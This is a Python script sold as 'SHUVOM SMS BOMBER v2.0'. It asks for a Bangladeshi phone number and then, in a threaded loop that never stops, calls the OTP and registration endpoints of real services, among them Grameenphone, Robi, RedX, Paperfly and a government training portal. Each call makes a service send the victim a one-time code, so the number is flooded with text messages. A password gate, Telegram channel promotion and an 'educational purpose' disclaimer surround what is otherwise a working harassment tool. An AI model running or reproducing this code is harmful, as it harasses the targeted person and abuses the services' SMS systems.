import os
import time
import threading
import requests

PASSWORD = "shuvom"

def show_channel():
    os.system("clear")
    time.sleep(2)

def banner():
    os.system("clear")
    show_channel()  # 🔥 টুল চালু হলেই প্রথমে চ্যানেল দেখাবে
    print(r"""

 ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗   ██╗██╗     
 ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║   ██║██║     
 ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝█████╗  ██║   ██║██║     
 ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██║   ██║██║     
 ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝███████╗
 ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝

 ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
 ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
 ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
 ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
 ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
 ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

                                                                                        

  SHUVOM SMS BOMBER v2.0
[+] Telegram Channel: https://t.me/minhaz_official24
[+] Remember This tool is only educational purpose 
[+] This tool by [SHUVOM]
""")

def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    if pw != PASSWORD:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()

    print("\033[1;32m[+] Access Granted!\033[0m")
    time.sleep(1)

    # 🔥 Password ঠিক দেওয়ার পর আবার সুন্দরভাবে Channel Show করবে
    show_channel()

    print("\033[1;36m[!] Be sure to join the Telegram channel to get all the updates on the tool.")
    print(f"[>] Telegram Channel: https://t.me/minhaz_official24\033[0m")
    input("Press Enter to continue to the main menu...")

def menu():
    banner()
    print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
    choice = input("Select an option: ")
    if choice == "1":
        start_bombing()
    else:
        print("\033[1;31m[-] Exiting...\033[0m")
        exit()

def get_target():
    number = input("Enter target number (01XXXXXXXXX): ")
    if number.startswith("01") and len(number) == 11:
        return number, "880" + number[1:]
    else:
        print("Invalid number format.")
        exit()

counter = 0
lock = threading.Lock()

def update_counter():
    global counter
    with lock:
        counter += 1
        print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")

def fast_apis(phone, full):
    try:
        requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0")
        update_counter()
    except: pass

    try:
        requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}")
        update_counter()
    except: pass

def normal_apis(phone, full):
    apis = [
        ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
        ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {"phone": phone}),
        ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
        ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
        ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
        ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
        ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
        ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
    ]

    for url, data in apis:
        try:
            requests.post(url, json=data)
            update_counter()
        except: pass

def start_bombing():
    phone, full = get_target()
    while True:
        threads = []

        for _ in range(3):
            t = threading.Thread(target=fast_apis, args=(phone, full))
            t.start()
            threads.append(t)

        t = threading.Thread(target=normal_apis, args=(phone, full))
        t.start()
        threads.append(t)

        for t in threads:
            t.join()
        time.sleep(1)

if __name__ == "__main__":
    banner()
    password_prompt()
    menu()
